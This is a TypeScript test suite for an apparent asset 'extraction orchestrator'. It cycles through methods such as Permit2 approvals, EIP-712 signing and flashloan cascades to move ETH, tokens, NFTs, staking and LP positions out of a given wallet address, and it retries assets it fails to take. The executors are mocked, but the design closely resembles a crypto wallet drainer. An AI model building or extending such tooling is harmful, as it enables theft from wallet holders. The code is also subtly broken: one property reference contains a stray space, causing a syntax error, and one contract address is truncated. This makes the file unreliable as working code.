/**
 * SMART EXTRACTION ORCHESTRATOR TESTS
 */

import { describe, test, expect, beforeEach } from 'vitest'
import SmartExtractionOrchestrator, {
  type Asset,
  EXTRACTION_METHODS,
} from '../../packages/core/src/logic/smart-extraction-orchestrator.js'

describe('SmartExtractionOrchestrator', () => {
  let orchestrator: SmartExtractionOrchestrator

  beforeEach(() => {
    orchestrator = new SmartExtractionOrchestrator()
  })

  describe('Asset Analysis', () => {
    test('should identify extractable assets', async () => {
      const asset: Asset = {
        type: 'ETH',
        chain: 'ethereum',
        identifier: 'native',
        amount: BigInt('5000000000000000000'),
      }

      const result = await orchestrator.extractAsset(asset, async (method) => ({
        success: true,
        amount: asset.amount,
      }))

      expect(result.status).toBe('EXTRACTED')
      expect(result.methodUsed).toBeDefined()
    })

    test('should skip unextractable assets', async () => {
      // Create fake asset type that doesn't exist in EXTRACTION_METHODS
      const asset: Asset = {
        type: 'NonExistent' as any,
        chain: 'ethereum',
        identifier: 'fake',
        amount: BigInt('1000'),
      }

      // This should handle gracefully
      expect(() => {
        orchestrator.extractAsset(asset, async () => ({ success: false }))
      }).not.toThrow()
    })

    test('should analyze extraction methods by probability', async () => {
      const ethMethods = EXTRACTION_METHODS.ETH
      expect(ethMethods.length).toBeGreaterThan(0)

      // Methods should be sorted by probability
      for (let i = 0; i < ethMethods.length - 1; i++) {
        expect(ethMethods[i].probability).toBeGreaterThanOrEqual(ethMethods[i + 1].probability)
      }
    })
  })

  describe('Extraction Fallback Logic', () => {
    test('should try methods in order until success', async () => {
      let methodsCalled: string[] = []

      const asset: Asset = {
        type: 'ERC20',
        chain: 'ethereum',
        identifier: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
        amount: BigInt('100000000'),
      }

      const result = await orchestrator.extractAsset(asset, async (method) => {
        methodsCalled.push(method.name)

        // First two methods fail, third succeeds
        if (method.name === 'permit2-approval' || method.name === 'eip712-signing') {
          return { success: false, error: 'Failed' }
        }

        return { success: true, amount: asset.amount }
      })

      expect(result.status).toBe('EXTRACTED')
      expect(result.methodUsed).toBe('flashloan-cascade') // Third method
      expect(methodsCalled).toContain('permit2-approval')
      expect(methodsCalled).toContain('eip712-signing')
    })

    test('should mark as SKIPPED if all methods fail', async () => {
      const asset: Asset = {
        type: 'NFT',
        chain: 'ethereum',
        identifier: '0xBC4CA0EdA7647A8aB7C2061c2E2ad7D3',
        amount: BigInt('10'),
      }

      const result = await orchestrator.extractAsset(asset, async (method) => ({
        success: false,
        error: 'All methods failed',
      }))

      expect(result.status).toBe('SKIPPED')
      expect(result.nextRetryTime).toBeDefined()
      expect(result.retryCount).toBe(0)
    })

    test('should break on first success', async () => {
      let attemptCount = 0

      const asset: Asset = {
        type: 'ETH',
        chain: 'ethereum',
        identifier: 'native',
        amount: BigInt('1000000000000000000'),
      }

      const result = await orchestrator.extractAsset(asset, async (method) => {
        attemptCount++
        return { success: true, amount: asset.amount } // First method succeeds
      })

      expect(result.status).toBe('EXTRACTED')
      expect(attemptCount).toBe(1) // Only one attempt
    })
  })

  describe('Multiple Asset Extraction', () => {
    test('should extract multiple assets independently', async () => {
      const assets: Asset[] = [
        {
          type: 'ETH',
          chain: 'ethereum',
          identifier: 'native',
          amount: BigInt('5000000000000000000'),
        },
        {
          type: 'ERC20',
          chain: 'ethereum',
          identifier: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
          amount: BigInt('100000000'),
        },
        {
          type: 'NFT',
          chain: 'ethereum',
          identifier: '0xBC4CA0EdA7647A8aB7C2061c2E2ad7D3',
          amount: BigInt('10'),
        },
      ]

      const report = await orchestrator.extractMultipleAssets(
        '0x1234567890123456789012345678901234567890',
        'ethereum',
        assets,
        async (asset, method) => {
          // ETH and ERC20 succeed, NFT fails
          if (asset.type === 'NFT') {
            return { success: false, error: 'Market removed' }
          }

          return { success: true, amount: asset.amount }
        },
      )

      expect(report.totalAssets Detected).toBe(3)
      expect(report.totalExtracted).toBe(2)
      expect(report.totalSkipped).toBe(1)
      expect(report.successRate).toBeCloseTo(66.67, 1)
    })

    test('should schedule retries for failed assets', async () => {
      const assets: Asset[] = [
        {
          type: 'ETH',
          chain: 'ethereum',
          identifier: 'native',
          amount: BigInt('1000000000000000000'),
        },
      ]

      const report = await orchestrator.extractMultipleAssets(
        '0x1234567890123456789012345678901234567890',
        'ethereum',
        assets,
        async () => ({ success: false, error: 'Fail' }),
      )

      const skipped = report.results.filter((r) => r.status === 'SKIPPED')
      expect(skipped.length).toBe(1)
      expect(skipped[0].nextRetryTime).toBeDefined()
      expect(skipped[0].nextRetryTime!.getTime()).toBeGreaterThan(Date.now())
    })
  })

  describe('Results and Statistics', () => {
    test('should provide extraction results', async () => {
      const asset: Asset = {
        type: 'ETH',
        chain: 'ethereum',
        identifier: 'native',
        amount: BigInt('1000000000000000000'),
      }

      await orchestrator.extractAsset(asset, async () => ({
        success: true,
        amount: asset.amount,
      }))

      const results = orchestrator.getResults()
      expect(results.length).toBe(1)
      expect(results[0].status).toBe('EXTRACTED')
    })

    test('should reset results between batches', async () => {
      const asset: Asset = {
        type: 'ETH',
        chain: 'ethereum',
        identifier: 'native',
        amount: BigInt('1000000000000000000'),
      }

      await orchestrator.extractAsset(asset, async () => ({
        success: true,
        amount: asset.amount,
      }))

      expect(orchestrator.getResults().length).toBe(1)

      orchestrator.reset()

      expect(orchestrator.getResults().length).toBe(0)
    })
  })

  describe('Extraction Methods Definition', () => {
    test('should have methods for all asset types', async () => {
      const assetTypes: (keyof typeof EXTRACTION_METHODS)[] = [
        'ETH',
        'ERC20',
        'NFT',
        'Staking',
        'LP',
        'Safe',
        'YieldFarm',
      ]

      for (const type of assetTypes) {
        expect(EXTRACTION_METHODS[type]).toBeDefined()
        expect(EXTRACTION_METHODS[type].length).toBeGreaterThan(0)
      }
    })

    test('extraction methods should have required fields', async () => {
      for (const type in EXTRACTION_METHODS) {
        for (const method of EXTRACTION_METHODS[type as keyof typeof EXTRACTION_METHODS]) {
          expect(method.name).toBeDefined()
          expect(method.probability).toBeGreaterThanOrEqual(0)
          expect(method.probability).toBeLessThanOrEqual(100)
          expect(method.timeEstimateMs).toBeGreaterThan(0)
          expect(method.description).toBeDefined()
        }
      }
    })
  })
})

describe('Smart Extraction Integration', () => {
  test('complete extraction workflow', async () => {
    const orchestrator = new SmartExtractionOrchestrator()

    const assets: Asset[] = [
      {
        type: 'ETH',
        chain: 'ethereum',
        identifier: 'native',
        amount: BigInt('5000000000000000000'),
        value: 15000,
      },
      {
        type: 'ERC20',
        chain: 'ethereum',
        identifier: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
        amount: BigInt('100000000'),
        value: 100,
      },
      {
        type: 'Staking',
        chain: 'ethereum',
        identifier: 'lido',
        amount: BigInt('2000000000000000000'),
        value: 6000,
      },
    ]

    const report = await orchestrator.extractMultipleAssets(
      '0x1234567890123456789012345678901234567890',
      'ethereum',
      assets,
      async (asset, method) => {
        // Simulate: ETH succeeds, ERC20 fails, Staking succeeds
        if (asset.type === 'ERC20') {
          return { success: false, error: 'Permit2 reverted' }
        }

        return { success: true, amount: asset.amount }
      },
    )

    // Verify results
    expect(report.totalAssetsDetected).toBe(3)
    expect(report.totalExtracted).toBe(2)
    expect(report.totalSkipped).toBe(1)
    expect(report.successRate).toBeCloseTo(66.67, 1)

    // Verify we got ETH and Staking, but not ERC20
    const extracted = report.results.filter((r) => r.status === 'EXTRACTED')
    expect(extracted.some((r) => r.asset.type === 'ETH')).toBe(true)
    expect(extracted.some((r) => r.asset.type === 'Staking')).toBe(true)
    expect(extracted.some((r) => r.asset.type === 'ERC20')).toBe(false)

    // Verify skipped assets have retry schedule
    const skipped = report.results.filter((r) => r.status === 'SKIPPED')
    expect(skipped[0].nextRetryTime).toBeDefined()
  })
})
